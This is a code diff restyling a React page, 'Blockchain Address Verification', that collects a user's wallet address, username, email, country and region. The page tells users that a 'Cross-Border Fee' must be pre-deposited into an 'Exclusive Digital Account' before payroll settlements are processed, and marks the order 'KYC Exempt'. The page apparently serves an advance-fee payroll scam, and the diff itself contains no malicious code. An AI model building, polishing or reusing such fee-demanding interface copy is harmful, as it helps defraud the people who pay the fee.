@@ -161,7 +161,7 @@ export default function BlockchainKycForm() {
 
   if (hydrating) {
     return (
-      <div className="min-h-screen-safe flex items-center justify-center bg-gray-50">
+      <div className="min-h-screen-safe flex items-center justify-center">
         <span className="w-8 h-8 border-2 border-[#1E3A8A]/20 border-t-[#1E3A8A] rounded-full animate-spin" />
       </div>
     );
@@ -169,7 +169,7 @@ export default function BlockchainKycForm() {
 
   if (!tx) {
     return (
-      <div className="min-h-screen-safe flex items-center justify-center bg-gray-50">
+      <div className="min-h-screen-safe flex items-center justify-center">
         <p className="text-gray-500 text-sm">Transaction not found.</p>
       </div>
     );
@@ -212,54 +212,52 @@ export default function BlockchainKycForm() {
 
   const sectionTitle = (n: number, title: string) => (
     <div className="flex items-center gap-2.5 mb-4 pb-3 border-b border-gray-100">
-      <span className="w-6 h-6 rounded-md bg-[#0A2B5E] text-white text-[11px] font-bold flex items-center justify-center flex-shrink-0">{n}</span>
+      <span className="verification-section-icon w-6 h-6 rounded-md text-[11px] font-bold flex items-center justify-center flex-shrink-0">{n}</span>
       <h3 className="text-[15px] font-bold text-[#0A2B5E] leading-tight tracking-tight">{title}</h3>
     </div>
   );
 
   const content = (
     <div className="space-y-3 sm:space-y-4 lg:space-y-5">
-      <div className="relative overflow-hidden rounded-2xl bg-[#0A2B5E] shadow-lg shadow-[#0A2B5E]/25">
-        <div className="absolute inset-0 opacity-[0.06]" style={{ backgroundImage: "repeating-linear-gradient(0deg,transparent,transparent 24px,#fff 24px,#fff 25px),repeating-linear-gradient(90deg,transparent,transparent 24px,#fff 24px,#fff 25px)" }} />
-        <div className="relative px-4 py-4 sm:px-6 sm:py-5">
-          <div className="flex items-center gap-3 sm:gap-4">
-            <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-xl bg-white/15 border border-white/20 flex items-center justify-center flex-shrink-0">
-              <Wallet className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
+      <section aria-label="Wallet provider and settlement requirements" className="verification-card relative overflow-hidden rounded-2xl">
+        <div aria-hidden="true" className="h-1 bg-gradient-to-r from-[#A5803D] via-[#EBD49B] to-[#F4EBDD]" />
+        <div className="px-4 py-5 sm:px-6 sm:py-6">
+          <div className="grid grid-cols-[auto_minmax(0,1fr)] items-center gap-x-3 gap-y-2 sm:grid-cols-[auto_minmax(0,1fr)_auto] sm:gap-x-4">
+            <div className="verification-section-icon w-11 h-11 sm:w-12 sm:h-12 rounded-xl flex items-center justify-center flex-shrink-0">
+              <Wallet className="w-5 h-5 sm:w-6 sm:h-6" />
             </div>
             <div className="min-w-0 flex-1">
-              <p className="text-[10px] font-bold uppercase tracking-widest text-blue-300">Wallet Provider</p>
-              <p className="text-base sm:text-lg font-bold text-white truncate">{walletName}</p>
+              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8A6329]">Wallet Provider</p>
+              <p className="mt-0.5 break-words text-base sm:text-lg font-bold text-[#14365D]">{walletName}</p>
             </div>
-            <span className={`flex-shrink-0 inline-flex items-center gap-1.5 rounded-full px-2.5 py-1 text-[10px] font-bold uppercase tracking-wider ${locked ? "bg-white/15 text-white" : "bg-amber-400 text-[#0A2B5E]"}`}>
+            <span className={`col-start-2 justify-self-start sm:col-auto sm:justify-self-end inline-flex items-center gap-1.5 rounded-full px-2.5 py-1 text-[10px] font-bold uppercase tracking-wider ${locked ? "bg-blue-50 text-[#14365D]" : "bg-[#F5EDDA] text-[#8A6329]"}`}>
               {locked ? <Lock className="w-3 h-3" /> : <ShieldCheck className="w-3 h-3" />}
               {locked ? "Pending" : "KYC Exempt"}
             </span>
           </div>
-          <div className="mt-3 pt-3 sm:mt-4 sm:pt-4 border-t border-white/15 grid grid-cols-2 gap-4">
+          <div className="mt-4 grid grid-cols-[minmax(0,1fr)_auto] gap-4 border-t border-[#EAE5DA] pt-4 sm:mt-5 sm:gap-6">
             <div className="min-w-0">
-              <p className="text-[10px] uppercase tracking-wider text-blue-300 font-semibold">Order ID</p>
-              <p className="text-sm font-semibold text-white font-mono truncate mt-0.5">{tx.ft_uid}</p>
+              <p className="text-[10px] uppercase tracking-wider text-gray-500 font-semibold">Order ID</p>
+              <p className="mt-1 break-all font-mono text-xs font-semibold leading-relaxed text-[#14365D] sm:text-sm">{tx.ft_uid}</p>
             </div>
-            <div className="min-w-0">
-              <p className="text-[10px] uppercase tracking-wider text-blue-300 font-semibold">Fund Review</p>
-              <p className="text-sm font-semibold text-white mt-0.5">Exempt</p>
+            <div className="min-w-0 border-l border-[#EAE5DA] pl-4 sm:pl-6">
+              <p className="text-[10px] uppercase tracking-wider text-gray-500 font-semibold">Fund Review</p>
+              <p className="mt-1 text-sm font-semibold leading-relaxed text-[#14365D]">Exempt</p>
             </div>
           </div>
         </div>
-      </div>
-
-      <div className="flex items-start gap-3 rounded-2xl border border-amber-200 bg-amber-50 px-3.5 py-3 sm:px-5 sm:py-3.5">
-        <div className="hidden sm:flex w-8 h-8 rounded-lg bg-amber-100 items-center justify-center flex-shrink-0">
-          <AlertTriangle className="w-4 h-4 text-amber-600" />
-        </div>
-        <AlertTriangle className="sm:hidden w-4 h-4 text-amber-600 flex-shrink-0 mt-0.5" />
-        <div>
-          <p className="text-sm font-bold text-amber-900">Cross-Border Fee Pre-Deposit Requirement</p>
-          <p className="text-xs text-amber-800 leading-relaxed mt-0.5">
+        <div className="border-t border-[#E8DABC] bg-gradient-to-br from-[#FBF7ED] to-[#FFFDFA] px-4 py-4 sm:px-6 sm:py-5">
+          <div className="flex items-start gap-2.5 sm:gap-3">
+            <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-lg border border-[#E8DABC] bg-white/80 text-[#8A6329] sm:h-8 sm:w-8">
+              <AlertTriangle className="h-3.5 w-3.5 sm:h-4 sm:w-4" aria-hidden="true" />
+            </span>
+            <h2 className="min-w-0 self-center text-[13px] font-bold leading-relaxed text-[#725326] sm:text-sm">Cross-Border Fee Pre-Deposit Requirement</h2>
+          </div>
+          <p className="mt-2.5 text-xs leading-6 text-[#6B604D] sm:pl-11 sm:text-[13px]">
             After you submit your application, the Cross-Border Fee must be pre-deposited into your activated Exclusive Digital Account. Once the pre-deposit is confirmed, all subsequent payroll settlements will be processed through this account, ensuring a clear, secure, and traceable settlement process.
           </p>
         </div>
-      </div>
+      </section>
 
       {locked && (
         <div className="flex items-start gap-3 rounded-2xl border border-blue-200 bg-[#EFF6FF] px-4 py-3.5 lg:px-5">
@@ -282,7 +280,7 @@ export default function BlockchainKycForm() {
           <p className="text-xs text-gray-500 mt-1">This verification method is currently not available for your order.</p>
         </div>
       ) : (
-        <div className="bg-white rounded-2xl border border-gray-200 shadow-sm divide-y divide-gray-100">
+        <div className="verification-card rounded-2xl divide-y divide-gray-100">
           <div className="p-4 sm:p-6">
             {sectionTitle(1, "Settlement Wallet")}
             {renderField("blockchain_address", "Exclusive Digital Account Receiving Address", Wallet, "e.g. 0x71C7656EC7ab88b098defB751B7401B5f6d8976F", {
@@ -295,8 +293,8 @@ export default function BlockchainKycForm() {
             <div className="grid grid-cols-2 gap-x-3 sm:gap-x-4 gap-y-2">
               <div className="col-span-2 sm:col-span-1">{renderField("blockchain_username", "Employee Username", User, "Your username")}</div>
               <div className="col-span-2 sm:col-span-1">{renderField("blockchain_email", "Email Address", Mail, "you@example.com", { type: "email" })}</div>
-              {renderField("blockchain_country", "Country", Globe, "e.g. United States")}
-              {renderField("blockchain_region", "State / Region", MapPin, "e.g. California")}
+              <div className="col-span-2">{renderField("blockchain_country", "Country", Globe, "e.g. United States")}</div>
+              <div className="col-span-2">{renderField("blockchain_region", "State / Region", MapPin, "e.g. California")}</div>
             </div>
           </div>
           <div className="p-4 sm:p-6">
@@ -312,7 +310,7 @@ export default function BlockchainKycForm() {
             <button
               onClick={handleSubmit}
               disabled={submitting || locked}
-              className="w-full sm:w-auto sm:min-w-[280px] sm:mx-auto sm:px-10 lg:w-full bg-[#0A2B5E] hover:bg-[#0d3571] text-white font-bold h-[52px] lg:h-12 rounded-xl flex items-center justify-center gap-2 transition-all shadow-lg shadow-[#0A2B5E]/20 active:scale-[0.98] text-[15px] lg:text-sm disabled:opacity-60 disabled:active:scale-100 disabled:shadow-none"
+              className="verification-action w-full sm:w-auto sm:min-w-[280px] sm:mx-auto sm:px-10 lg:w-full hover:brightness-110 text-white font-bold h-[52px] lg:h-12 rounded-xl flex items-center justify-center gap-2 transition-all active:scale-[0.98] text-[15px] lg:text-sm disabled:opacity-60 disabled:active:scale-100 disabled:shadow-none"
             >
               {submitting ? <Loader className="w-5 h-5 animate-spin" /> : locked ? <Lock className="w-4 h-4" /> : <CheckCircle className="w-5 h-5" />}
               {submitting ? "Submitting..." : locked ? "Submitted" : "Submit Verification"}
@@ -322,7 +320,7 @@ export default function BlockchainKycForm() {
         </div>
       )}
 
-      <div className="flex items-start gap-3 bg-white lg:bg-gray-50 border border-gray-200 rounded-2xl lg:rounded-xl px-4 py-3.5">
+      <div className="verification-card flex items-start gap-3 rounded-2xl lg:rounded-xl px-4 py-3.5">
         <ShieldCheck className="w-4 h-4 text-[#1E3A8A] lg:text-gray-400 flex-shrink-0 mt-0.5" />
         <p className="text-xs text-gray-500 leading-relaxed">
           All verification information is encrypted and processed exclusively through ISFC's official secure authentication system.
@@ -332,50 +330,59 @@ export default function BlockchainKycForm() {
   );
 
   return (
-    <div className="min-h-screen-safe flex flex-col bg-[radial-gradient(circle_at_top,_#F8FBFF_0%,_#EEF5FC_48%,_#DDEAF7_100%)]">
+    <div className="min-h-screen-safe flex flex-col">
       <Header />
 
-      <main className="lg:hidden flex-1 flex flex-col bg-gray-50">
-        <div className="relative overflow-hidden bg-gradient-to-br from-[#0d3571] via-[#0A2B5E] to-[#061d42] px-4 sm:px-6 pt-3 pb-8 sm:pt-5 sm:pb-10">
-          <div className="pointer-events-none absolute -right-12 -top-16 h-44 w-44 rounded-full bg-teal-300/10 blur-3xl" />
-          <div className="relative mx-auto w-full sm:max-w-2xl">
-            <div className="flex items-center justify-between gap-3 mb-3 sm:mb-4">
-              <button onClick={() => navigate(-1)} className="flex items-center gap-2 text-blue-200 hover:text-white transition">
-                <span className="w-8 h-8 rounded-full bg-white/10 ring-1 ring-white/15 flex items-center justify-center"><ArrowLeft className="w-4 h-4" /></span>
-                <span className="text-[13px] font-medium">Back</span>
+      <main className="settlement-mobile relative flex min-w-0 flex-1 flex-col lg:hidden">
+        <div className="verification-hero pb-12 sm:pb-14">
+          <div className="mx-auto w-full">
+            <div className="verification-toolbar">
+              <button onClick={() => navigate(-1)} className="verification-back">
+                <span className="verification-back-icon"><ArrowLeft className="w-4 h-4" /></span>
+                Back
               </button>
-              <span className="inline-flex items-center gap-1.5 bg-white/10 ring-1 ring-white/15 rounded-full px-2.5 py-1">
-                <Wallet className="w-3.5 h-3.5 text-teal-300" />
-                <span className="text-[11px] font-bold text-white">Blockchain</span>
+              <span className="verification-badge">
+                <Wallet className="w-3.5 h-3.5" />
+                <span>Blockchain</span>
               </span>
             </div>
-            <div className="flex items-center gap-2 mb-1">
-              <ShieldCheck className="w-3.5 h-3.5 text-blue-300" />
-              <span className="text-[10px] text-blue-300 uppercase tracking-widest font-bold">Alternative Verification</span>
+            <div className="verification-eyebrow">
+              <ShieldCheck className="w-3.5 h-3.5 flex-shrink-0" />
+              <span>Alternative Verification</span>
             </div>
-            <h1 className="text-lg sm:text-2xl font-bold text-white leading-tight">Blockchain Address Verification</h1>
-            <p className="text-blue-200/90 text-xs sm:text-sm mt-1.5 leading-relaxed sm:max-w-lg">Provide your Exclusive Digital Account Receiving Address to complete verification.</p>
+            <h1 className="verification-heading">Blockchain Address Verification</h1>
+            <p className="verification-description">Provide your Exclusive Digital Account Receiving Address to complete verification.</p>
           </div>
         </div>
-        <div className="relative flex-1 -mt-4 bg-gray-50 rounded-t-3xl pt-4 sm:pt-6 px-3 sm:px-6" style={{ paddingBottom: "max(1.5rem, env(safe-area-inset-bottom))" }}>
-          <div className="mx-auto w-full sm:max-w-2xl">{content}</div>
+        <div className="verification-content z-10 -mt-7 rounded-t-[28px] sm:-mt-8 sm:rounded-t-[32px] flex-1 pt-4 sm:pt-6 px-4 sm:px-6" style={{ paddingBottom: "max(1.5rem, env(safe-area-inset-bottom))" }}>
+          <div className="mx-auto w-full">{content}</div>
         </div>
       </main>
 
-      <main className="hidden lg:block flex-1 max-w-2xl mx-auto px-4 py-8 w-full">
-        <button onClick={() => navigate(-1)} className="flex items-center gap-2 text-sm font-semibold text-[#0A2B5E] hover:text-[#1E3A8A] mb-6 group">
-          <span className="flex items-center justify-center w-8 h-8 rounded-full bg-white border border-gray-200 shadow-sm group-hover:shadow-md transition"><ArrowLeft className="w-4 h-4" /></span>
+      <main className="mx-auto hidden w-full max-w-[1040px] flex-1 px-8 py-8 lg:block xl:py-10">
+        <button onClick={() => navigate(-1)} className="verification-back verification-back-desktop mb-5">
+          <span className="verification-back-icon"><ArrowLeft className="w-4 h-4" aria-hidden="true" /></span>
           Back
         </button>
-        <div className="mb-8">
-          <div className="flex items-center gap-2 text-[#0A2B5E] mb-1">
-            <Wallet className="w-5 h-5" />
-            <span className="text-sm font-semibold">Alternative Verification &middot; {tx.ft_uid}</span>
+        <div className="settlement-document overflow-hidden rounded-[28px]">
+          <div className="verification-hero verification-hero-desktop">
+            <div className="verification-eyebrow">
+              <ShieldCheck className="w-3.5 h-3.5 flex-shrink-0" />
+              <span>Alternative Verification</span>
+            </div>
+            <div className="verification-title-row">
+              <h1 className="verification-heading">Blockchain Address Verification</h1>
+              <span className="verification-badge"><Wallet className="w-3.5 h-3.5" aria-hidden="true" /><span>Blockchain</span></span>
+            </div>
+            <p className="verification-description">Provide your Exclusive Digital Account Receiving Address below to complete verification.</p>
+            <div className="verification-reference">
+              <span>FT-UID</span><span className="font-mono">{tx.ft_uid}</span>
+            </div>
           </div>
-          <h1 className="text-2xl font-bold text-[#0A2B5E]">Blockchain Address Verification</h1>
-          <p className="text-sm text-gray-500 mt-1">Provide your Exclusive Digital Account Receiving Address below to complete verification.</p>
+          <div className="relative z-10 -mt-6 rounded-t-[24px] bg-white px-8 pt-5 pb-6 xl:px-12">
+            {content}
+          </div>
         </div>
-        {content}
       </main>
 
       <Footer />
